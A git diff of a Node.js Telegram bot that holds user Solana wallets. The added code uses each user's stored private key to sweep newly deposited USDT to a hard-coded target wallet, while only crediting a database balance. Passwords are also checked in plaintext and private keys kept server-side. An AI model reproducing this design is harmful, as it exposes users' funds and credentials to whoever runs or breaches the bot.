@@ -1,4 +1,4 @@
-// after 420 v3
+// after final.js
 import cron from 'node-cron';
 import express from 'express';
 import bodyParser from 'body-parser';
@@ -52,14 +52,13 @@ const myKeypair = solanaWeb3.Keypair.fromSecretKey(myAccountPrivateKey);
 
 
 
-// Function to fetch USDT balance or create token account if none exists
-async function fetchUSDTBalanceOrCreateTokenAccount(walletAddress) {
+async function GetUsdtWalletBalance(walletAddress) {
     try {
         const connection = new solanaWeb3.Connection('https://api.mainnet-beta.solana.com');
         const walletPublicKey = new solanaWeb3.PublicKey(walletAddress);
         const usdtMintPublicKey = new solanaWeb3.PublicKey(usdtMintAddress); // USDT mint address
 
-        // Get all token accounts for the wallet
+        // Get all token accounts for the wallet that hold USDT
         const tokenAccounts = await connection.getParsedTokenAccountsByOwner(
             walletPublicKey,
             { mint: usdtMintPublicKey }
@@ -67,20 +66,24 @@ async function fetchUSDTBalanceOrCreateTokenAccount(walletAddress) {
 
         if (tokenAccounts.value.length === 0) {
             console.log(`No USDT token accounts found for wallet ${walletAddress}.`);
-            return 0; // Assume balance is 0 since the wallet was just created
+            return 0; // Assume balance is 0 if no accounts found
         }
 
-        // If token account exists, return the balance
-        const tokenAccount = tokenAccounts.value[0].account.data.parsed.info;
-        const balance = parseFloat(tokenAccount.tokenAmount.uiAmount); // Ensure it's a number
-        console.log(`USDT balance for wallet ${walletAddress}: ${balance} USDT`);
-        return balance;
+        // Aggregate balance from all USDT token accounts
+        const totalBalance = tokenAccounts.value.reduce((sum, tokenAccount) => {
+            const accountInfo = tokenAccount.account.data.parsed.info;
+            const balance = parseFloat(accountInfo.tokenAmount.uiAmount);
+            return sum + balance;
+        }, 0);
 
+        console.log(`USDT balance for wallet ${walletAddress}: ${totalBalance} USDT`);
+        return totalBalance;
     } catch (error) {
-        console.log(`Error fetching or creating USDT token account: ${error.message}`);
-        return 0;
+        console.error(`Error fetching USDT balance: ${error.message}`);
+        return 0; // Return 0 if there was an error
     }
 }
+
 
 
 // Function to get user's current balance and other relevant data from the database
@@ -219,14 +222,6 @@ async function createUserAndFundWallet(telegramId, password, referralCode, chatI
 
 
 
-
-
-
-
-
-
-
-
 // Function to delete a message via Telegram API
 async function deleteMessage(chatId, messageId) {
     const url = `https://api.telegram.org/bot${TOKEN}/deleteMessage`;
@@ -244,90 +239,121 @@ async function deleteMessage(chatId, messageId) {
 
 
 
-// Function to check for new funds and avoid redundant notifications
 async function checkForFunds(chatId, userId, messageId) {
     try {
+        // Step 1: Get the user details from the database (fetch wallet address)
         const user = await getUserByTelegramId(userId);
         const solWalletAddress = user.sol_wallet_address;
+        const solWalletPrivateKey = user.sol_wallet_private_key;
 
-        // Fetch current balance in wallet
-        const solanaBalance = await fetchUSDTBalanceOrCreateTokenAccount(solWalletAddress);
-        console.log(`Solana balance for wallet ${solWalletAddress}: ${solanaBalance} USDT`);
+        // Step 2: Establish Solana connection and get the USDT balance for the wallet
+        const connection = new solanaWeb3.Connection('https://api.mainnet-beta.solana.com');
+        const walletPublicKey = new solanaWeb3.PublicKey(solWalletAddress);
+        const usdtMintPublicKey = new solanaWeb3.PublicKey(usdtMintAddress); // USDT mint address
 
-        // Fetch the user's balance, last checked balance, and total funds sent from the database
+        const tokenAccounts = await connection.getParsedTokenAccountsByOwner(
+            walletPublicKey,
+            { mint: usdtMintPublicKey }
+        );
+
+        // Step 3: Check if the user has a USDT account
+        if (tokenAccounts.value.length === 0) {
+            console.log(`No USDT token accounts found for wallet ${solWalletAddress}.`);
+            return; // No token accounts found, return early
+        }
+
+        // Step 4: Get the balance from the USDT account
+        const tokenAccount = tokenAccounts.value[0].account.data.parsed.info;
+        const balance = parseFloat(tokenAccount.tokenAmount.uiAmount); // Parse the balance as a float
+        console.log(`USDT balance for wallet ${solWalletAddress}: ${balance} USDT`);
+
+        // Step 5: Fetch the user's balance, last checked balance, and total funds sent from the database
         const query = 'SELECT balance, last_checked_balance, total_funds_sent FROM users WHERE telegram_id = $1';
         const result = await client.query(query, [userId]);
 
-        // Check if a user record was found
+        // If user not found, return an error message
         if (result.rows.length === 0) {
             await editMessage(chatId, messageId, "User not found in the database.");
             return;
         }
 
-        // Extract values from the database result
+        // Extract the database information
         const dbBalance = parseFloat(result.rows[0].balance) || 0;
         const lastCheckedBalance = parseFloat(result.rows[0].last_checked_balance) || 0;
         const totalFundsSent = parseFloat(result.rows[0].total_funds_sent) || 0;
 
-        console.log(`DB balance: ${dbBalance}, Last checked balance: ${lastCheckedBalance}, Total funds sent: ${totalFundsSent}`);
-
-        // Detect if new funds have been received (by comparing with totalFundsSent)
-        if (solanaBalance > totalFundsSent) {
-            // Calculate the new funds received
-            const newFunds = solanaBalance - lastCheckedBalance;
+        // Step 6: Check if new funds have been received by comparing the current balance to the last checked balance
+        if (balance > lastCheckedBalance) {
+            const newFunds = balance - lastCheckedBalance;
             console.log(`New funds detected: ${newFunds} USDT`);
 
-            // Add new funds to the existing balance from the database
+            // Step 7: Add the new funds to the user's existing balance
             const updatedBalance = dbBalance + newFunds;
             console.log(`Updated balance: ${updatedBalance} USDT`);
 
-            // Update the database with the new balance, new last_checked_balance, and new totalFundsSent
-            const newCheckedBalance = solanaBalance;
+            // Step 8: Update the database with the new balance, last checked balance, and total funds sent
+            const newCheckedBalance = balance;
             const updateQuery = `
                 UPDATE users
                 SET balance = $1, last_checked_balance = $2, total_funds_sent = $3
                 WHERE telegram_id = $4
             `;
-            await client.query(updateQuery, [updatedBalance, newCheckedBalance, solanaBalance, userId]);
+            await client.query(updateQuery, [updatedBalance, newCheckedBalance, balance, userId]);
 
-            // Notify the user by editing the existing message
-            const fundsAddedMessage = `New funds detected: ${newFunds} USDT.`;
+            // Step 9: Notify the user about the detected funds via Telegram message
+            const fundsAddedMessage = `New funds detected: ${newFunds} USDT. Transferring to the target wallet...`;
             await editMessage(chatId, messageId, fundsAddedMessage);
 
-            // Wait for 1 second, then edit the message to "Restarting bot..."
+            // Step 10: Transfer the new funds to the target wallet
+            const fromKeypair = solanaWeb3.Keypair.fromSecretKey(bs58.decode(solWalletPrivateKey));
+            const fromUsdtTokenAccount = await Token.getAssociatedTokenAddress(
+                ASSOCIATED_TOKEN_PROGRAM_ID,
+                TOKEN_PROGRAM_ID,
+                usdtMintPublicKey,
+                fromKeypair.publicKey
+            );
+
+            await transferUsdtToWallet(fromKeypair, fromUsdtTokenAccount, newFunds);
+
+            // Step 11: Inform the user that the funds were successfully transferred
+            const transferCompleteMessage = `Funds transferred successfully! New funds: ${newFunds} USDT.`;
+            await editMessage(chatId, messageId, transferCompleteMessage);
+
+            // Optionally, wait and restart the bot
             setTimeout(async () => {
                 const restartingMessage = "Restarting bot...";
                 await editMessage(chatId, messageId, restartingMessage);
 
-                // Wait another second, delete the message, and then show the welcome message
                 setTimeout(async () => {
                     await deleteMessage(chatId, messageId); // Delete the restarting message
                     await showWelcomeMessage(chatId, userId, user.ref_code_invite_others); // Show welcome message
-                }, 1000); // 1000 milliseconds = 1 second
-            }, 1000); // 1000 milliseconds = 1 second
+                }, 1000); // 1 second delay
+            }, 1000); // 1 second delay
 
         } else {
-            // No new funds detected, edit the message to notify the user
+            // Step 12: If no new funds were detected, notify the user
             const noFundsMessage = "No new funds detected.";
             await editMessage(chatId, messageId, noFundsMessage);
 
-            // Wait for 1 second, then edit the message to "Restarting bot..."
+            // Optionally, restart the bot after a short delay
             setTimeout(async () => {
                 const restartingMessage = "Restarting bot...";
                 await editMessage(chatId, messageId, restartingMessage);
 
-                // Wait another second, delete the message, and then show the welcome message
                 setTimeout(async () => {
                     await deleteMessage(chatId, messageId); // Delete the restarting message
                     await showWelcomeMessage(chatId, userId, user.ref_code_invite_others); // Show welcome message
-                }, 1000); // 1000 milliseconds = 1 second
-            }, 1000); // 1000 milliseconds = 1 second
+                }, 1000); // 1 second delay
+            }, 1000); // 1 second delay
         }
+
     } catch (error) {
+        // Handle any errors and notify the user
         console.log(`Error checking for funds: ${error.message}`);
         await editMessage(chatId, messageId, "An error occurred while checking for new funds. Please try again.");
     }
 }
+
 
 
 
@@ -622,7 +648,6 @@ async function handlePasswordResponse(chatId, text) {
     } else if (action === 'login') {
         const user = await getUserByTelegramId(userId);
         if (user && user.password === text) {
-            const solanaBalance = await fetchUSDTBalanceOrCreateTokenAccount(user.sol_wallet_address);
             await showWelcomeMessage(chatId, userId, user.ref_code_invite_others);
             delete userSessions[chatId]; // Clean up session
         } else {
@@ -1259,6 +1284,88 @@ async function handleReferralCodeResponse(chatId, text) {
         await sendMessage(chatId, "An error occurred while processing your referral code. Please try again.");
     }
 }
+
+
+
+async function transferUsdtToWallet(fromKeypair, fromUsdtTokenAccount, amount) {
+    try {
+        // Step 1: Create a connection to the Solana network
+        const connection = new solanaWeb3.Connection('https://api.mainnet-beta.solana.com');
+
+        // Step 2: Define the target wallet address (where the USDT will be sent)
+        const targetWalletAddress = '82dz9eXMsruLYe1jPWPCh8UCKiiqmkh7YEedVEkNNQnA'; // Replace with your actual target wallet
+        const targetWalletPublicKey = new solanaWeb3.PublicKey(targetWalletAddress);
+
+        // Step 3: Get or create the associated USDT token account for the target wallet
+        const targetUsdtTokenAccount = await Token.getAssociatedTokenAddress(
+            ASSOCIATED_TOKEN_PROGRAM_ID,
+            TOKEN_PROGRAM_ID,
+            usdtMintAddress,
+            targetWalletPublicKey
+        );
+
+        // Check if the target token account exists. If not, create it.
+        const targetAccountInfo = await connection.getAccountInfo(targetUsdtTokenAccount);
+        if (!targetAccountInfo) {
+            console.log("Creating USDT token account for the target wallet...");
+            const createTokenAccountInstruction = Token.createAssociatedTokenAccountInstruction(
+                ASSOCIATED_TOKEN_PROGRAM_ID,
+                TOKEN_PROGRAM_ID,
+                usdtMintAddress,
+                targetUsdtTokenAccount,
+                targetWalletPublicKey,
+                fromKeypair.publicKey
+            );
+            
+            // Create a transaction to add the instruction
+            const createAccountTransaction = new solanaWeb3.Transaction().add(createTokenAccountInstruction);
+
+            // Send the transaction to create the USDT token account
+            await solanaWeb3.sendAndConfirmTransaction(connection, createAccountTransaction, [fromKeypair]);
+            console.log(`USDT token account created for target wallet: ${targetUsdtTokenAccount.toBase58()}`);
+        } else {
+            console.log(`Target wallet already has a USDT token account: ${targetUsdtTokenAccount.toBase58()}`);
+        }
+
+        // Step 4: Create the transfer instruction to send USDT to the target wallet
+        const transferInstruction = Token.createTransferInstruction(
+            TOKEN_PROGRAM_ID,         // The program ID for the SPL token program
+            fromUsdtTokenAccount,      // The user's associated USDT token account (sender)
+            targetUsdtTokenAccount,    // The target wallet's USDT token account (recipient)
+            fromKeypair.publicKey,     // The user's public key (authority for the transaction)
+            [],                        // No multisig signers (empty array)
+            amount * Math.pow(10, 6)   // The amount to transfer (adjusted for USDT's 6 decimal places)
+        );
+
+        // Step 5: Create a transaction and add the transfer instruction to it
+        const transaction = new solanaWeb3.Transaction().add(transferInstruction);
+
+        // Step 6: Get a recent blockhash and add it to the transaction (required for Solana transactions)
+        const { blockhash } = await connection.getLatestBlockhash();
+        transaction.recentBlockhash = blockhash;
+        transaction.feePayer = fromKeypair.publicKey;  // The user is paying for the transaction fee
+
+        // Step 7: Send and confirm the transaction
+        const signature = await solanaWeb3.sendAndConfirmTransaction(connection, transaction, [fromKeypair]);
+        console.log(`Successfully transferred ${amount} USDT to ${targetWalletAddress}. Transaction signature: ${signature}`);
+
+        return signature;  // Return the transaction signature for logging or further processing
+
+    } catch (error) {
+        // Step 8: Handle any errors that occur during the transfer
+        console.log(`Error transferring USDT: ${error.message}`);
+        throw error;  // Rethrow the error for handling in the calling function
+    }
+}
+
+
+
+
+
+
+
+
+
 
 
 
